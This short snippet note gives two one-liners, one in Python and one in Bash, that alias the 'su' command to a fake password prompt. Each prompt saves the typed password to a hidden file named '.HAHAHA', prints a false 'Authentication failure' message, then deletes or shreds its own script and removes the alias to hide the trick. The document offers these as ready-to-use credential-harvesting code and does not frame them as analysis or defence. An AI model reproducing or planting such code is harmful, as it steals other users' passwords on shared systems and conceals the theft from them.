# Python
```
echo -e "import getpass\npassword = getpass.getpass('Password: ')\nprint('su: Authentication failure')\ntxt = open('.HAHAHA','w')\ntxt.writelines(password)" > hihihi.py ; alias su="python hihihi.py ; shred -n10 hihihi.py ; rm -f hihihi.py ; unalias su "
```
# Bash
add '$' before the second 'OOO'
```
echo -e "\nread -p 'Password: ' -s OOO \necho OOO >.HAHAHA \necho '' \necho 'su: Authentication failure'" >hohoho.sh ; alias su="bash hohoho.sh ; rm -f hohoho.sh ; unalias su "
```
